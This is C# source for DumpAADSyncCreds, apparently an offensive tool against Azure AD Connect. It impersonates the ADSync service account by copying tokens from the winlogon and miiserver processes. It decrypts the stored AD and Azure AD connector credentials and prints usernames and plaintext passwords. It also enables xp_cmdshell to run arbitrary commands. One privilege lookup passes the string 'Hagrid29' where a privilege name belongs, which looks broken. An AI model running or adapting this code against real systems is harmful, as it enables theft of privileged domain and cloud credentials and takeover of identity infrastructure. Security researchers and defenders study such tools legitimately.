using Microsoft.DirectoryServices.MetadirectoryServices.Cryptography;
using System;
using System.Data.SqlClient;
using Microsoft.Win32;
using System.Xml.Linq;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Management;

namespace DumpAADSyncCreds
{

	class Program
	{
	
		private static bool copyProcessToken(string processName)
		{
			
			Program.LUID luid = default(Program.LUID);
			Program.TOKEN_PRIVILEGES token_PRIVILEGES = default(Program.TOKEN_PRIVILEGES);
			bool flag = false;
			Process[] processesByName = Process.GetProcessesByName(processName);
			if (processesByName.Length != 0)
			{
				Process process = processesByName[0];
				IntPtr intPtr;
				WinAPI.OpenProcessToken(Process.GetCurrentProcess().Handle, 40U, out intPtr);
				WinAPI.LookupPrivilegeValue(null, "Hagrid29", ref luid);
				token_PRIVILEGES.PrivilegeCount = 1;
				token_PRIVILEGES.Privileges = new Program.LUID_AND_ATTRIBUTES[token_PRIVILEGES.PrivilegeCount];
				token_PRIVILEGES.Privileges[0] = default(Program.LUID_AND_ATTRIBUTES);
				token_PRIVILEGES.Privileges[0].Luid = luid;
				token_PRIVILEGES.Privileges[0].Attributes = 2U;
				if (WinAPI.AdjustTokenPrivileges(intPtr, false, ref token_PRIVILEGES, 0U, IntPtr.Zero, IntPtr.Zero))
				{
					IntPtr intPtr2;
					if (WinAPI.OpenProcessToken(process.Handle, 6U, out intPtr2))
					{
						IntPtr intPtr3;
						WinAPI.DuplicateToken(intPtr2, 2, out intPtr3);
						if (flag = WinAPI.SetThreadToken(IntPtr.Zero, intPtr3))
						{
							WinAPI.CloseHandle(intPtr3);
						}
						WinAPI.CloseHandle(intPtr2);
					}
					WinAPI.CloseHandle(intPtr);
				}
			}
			if (!flag)
			{
				int lastWin32Error = Marshal.GetLastWin32Error();
				if (lastWin32Error == 0)
				{
					flag = true;
				}
				else
				{
					string arg = lastWin32Error.ToString("x");
					Console.WriteLine("Error: 0x{0}", arg);
				}
			}
			return flag;
		}

		public struct LUID
		{
			public uint LowPart;

			public int HighPart;
		}

		[StructLayout(LayoutKind.Sequential, Pack = 4)]
		public struct LUID_AND_ATTRIBUTES
		{
			public Program.LUID Luid;

			public uint Attributes;
		}

		public struct TOKEN_PRIVILEGES
		{
			public int PrivilegeCount;

			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
			public Program.LUID_AND_ATTRIBUTES[] Privileges;
		}

		static public void printHelp()
        {
			Console.WriteLine(
				"DumpAADSyncCreds\n" +
				"More info: https://github.com/Hagrid29/DumpAADSyncCreds\n" +
				"Example:\n" +
				"\tset PATH=%PATH%;C:\\Program Files\\Microsoft Azure AD Sync\\Bin;\n" +
				"\tDumpAADSyncCreds.exe get_token\n" +
				"Options:\n" +
				"Dump AAD connect account credential in current context:\n" +
					"\tDumpAADSyncCreds.exe [raw_output]\n" +
				"Copy token of ADSync service account and dump AAD connect account credential:\n" +
					"\tDumpAADSyncCreds.exe get_token [raw_output]\n" +
				"Execute command as ADSync service account via xp_cmdshell:\n" +
					"\tDumpAADSyncCreds.exe xp_cmd \"\\\"C:\\Program Files\\Microsoft Azure AD Sync\\Bin\\DumpAADSyncCreds.exe\\\"\"\n" +
				"Print status of ADSync service:\n" +
					"\tDumpAADSyncCreds.exe check_service\n"
			);
			
		}

		static public void checkService(out string connectionString, out bool isSrvRunning, out string ADSyncUser, out string version, out string ADSyncLocation)
        {
			string paramReg = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\ADSync\\Parameters";
			string dBServer = (string)Registry.GetValue(paramReg, "Server", "");
			string dBName = (string)Registry.GetValue(paramReg, "DBName", "");
			string dBInstance = (string)Registry.GetValue(paramReg, "SQLInstance", "");
			ADSyncLocation = (string)Registry.GetValue(paramReg, "Path", "");
			connectionString = "Data Source=" + dBServer + "\\" + dBInstance + ";Initial Catalog=" + dBName;

			isSrvRunning = false;
			ADSyncUser = null;
			var versionInfo = FileVersionInfo.GetVersionInfo(ADSyncLocation + "bin\\miiserver.exe");
			version = versionInfo.FileVersion;
			SelectQuery sQuery = new SelectQuery(string.Format("select name, startname from Win32_Service where name = 'ADSync'"));
			using (ManagementObjectSearcher mgmtSearcher = new ManagementObjectSearcher(sQuery))
			{
				foreach (ManagementObject service in mgmtSearcher.Get())
				{
					ADSyncUser = service["startname"].ToString();
					isSrvRunning = true;
				}
			}
			
		}
		
		static void Main(string[] args)
		{
			string connectionString;
			bool isSrvRunning = false;
			string ADSyncUser;
			string version;
			string ADSyncLocation;
			checkService(out connectionString, out isSrvRunning, out ADSyncUser, out version, out ADSyncLocation);

            if (!isSrvRunning)
            {
				Console.WriteLine("[-] ADSync service is not running");
				return;
            }

			bool getToken = false;
			bool raw_output = false;

			if (args.Length > 0)
			{
				if (args[0] == "xp_cmd")
				{
					string cmd = args[1];
					Console.WriteLine("[+] Opening database: {0}", connectionString);
					using (SqlConnection conn = new SqlConnection(connectionString))
					{
						conn.Open();
						SqlCommand command = new SqlCommand("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell '" + cmd + "'", conn);
						SqlDataReader reader = command.ExecuteReader();
						Console.WriteLine("[+] Executed command: " + "EXEC xp_cmdshell '" + cmd + "'");
						while (reader.Read())
						{
							Console.WriteLine(reader[0].ToString());
						}
						reader.Close();
					}
					return;

				}
				if (args[0] == "get_token")
				{
					getToken = true;
					if (args.Length == 2)
						if (args[1] == "raw_output")
							raw_output = true;
				}
				if (args[0] == "raw_output")
					raw_output = true;
				if (args[0] == "check_service")
                {
					Console.WriteLine("Is ADSync service running:\t" + isSrvRunning.ToString());
					Console.WriteLine("ADSync bin path:\t\t" + ADSyncLocation + "bin\\");
					Console.WriteLine("ADSync service account:\t\t" + ADSyncUser);
					Console.WriteLine("ADSync version:\t\t\t" + version);
					Console.WriteLine("*** ADSync passwords can be read or modified as local administrator only for ADSync version 1.3.xx.xx");
					return;
				}
				if(args[0] == "print_help")
                {
					printHelp();
					return;
                }
			}

			KeyManager keyManager = new KeyManager();
			Console.WriteLine("[+] Opening database: {0}", connectionString);
			using (SqlConnection conn = new SqlConnection(connectionString))
			{
				conn.Open();

				if (getToken)
				{
					if (copyProcessToken("winlogon") && copyProcessToken("miiserver"))
						Console.WriteLine("[+] Obtained ADSync service account token from miiserver process...");
					else
						Console.WriteLine("[-] Could not change to ADSync service account. MUST be run as administrator!");
				}

				SqlCommand command = new SqlCommand("SELECT instance_id, keyset_id, entropy FROM mms_server_configuration;", conn);
				SqlDataReader reader = command.ExecuteReader();
				reader.Read();

				uint keyset_id = (uint)reader.GetInt32(1);

				Guid instance_id = new Guid(reader[0].ToString());
				Guid entropy = new Guid(reader[2].ToString());
				keyManager.LoadKeySet(entropy, instance_id, keyset_id);
				reader.Close();
				Key credKey = null;
				keyManager.GetActiveCredentialKey(ref credKey);

				//// Read the AD configuration data
				Console.WriteLine("==========   AD configuration   ==========");
				command = new SqlCommand("SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD';", conn);
				reader = command.ExecuteReader();

				int n = 1;
				while (reader.Read())
				{
					XElement ad_conf = XElement.Parse(reader[0].ToString());
					string ad_domain = (string)ad_conf.Element("forest-login-domain");
					string ad_user = (string)ad_conf.Element("forest-login-user");
					string plain = null;
					// decrypt configuration file
					credKey.DecryptBase64ToString(reader[1].ToString(), ref plain);
					XElement ad_conf2 = XElement.Parse(plain);
					string ad_password = (string)ad_conf2.Element("attribute");
					if (raw_output)
					{
						Console.WriteLine("AD Configuration " + n.ToString() + ":");
						Console.WriteLine(ad_conf);
						Console.WriteLine();
						Console.WriteLine(ad_conf2);
					}
                    else
                    {
						Console.WriteLine("AD Domain " + n.ToString() + ": " + ad_domain);
						Console.WriteLine("AD User " + n.ToString() + ": " + ad_user);
						Console.WriteLine("AD Password " + n.ToString() + ": " + ad_password);
					}
					n++;
				}
				reader.Close();
				Console.WriteLine();

				////Read the AAD configuration data
				Console.WriteLine("==========   AAD configuration   ==========");
				command = new SqlCommand("SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE subtype = 'Windows Azure Active Directory (Microsoft)';", conn);
				reader = command.ExecuteReader();
				n = 1;
				while (reader.Read())
				{
					XElement aad_conf = XElement.Parse(reader[0].ToString());
					string aad_user = (string)aad_conf.Element("parameter-values");
					string plain2 = null;
					// decrypt configuration file
					credKey.DecryptBase64ToString(reader[1].ToString(), ref plain2);
					XElement aad_conf2 = XElement.Parse(plain2);
					string aad_password = (string)aad_conf2.Element("attribute");
					if (raw_output)
					{
						Console.WriteLine("AAD Configuration " + n.ToString() + ":");
						Console.WriteLine(aad_conf);
						Console.WriteLine();
						Console.WriteLine(aad_conf2);
					}
					else 
					{
						Console.WriteLine("AAD User " + n.ToString() + ": " + aad_user);
						Console.WriteLine("AAD Password " + n.ToString() + ": " + aad_password);
					}
				}

				reader.Close();
			}
		}
	}
}
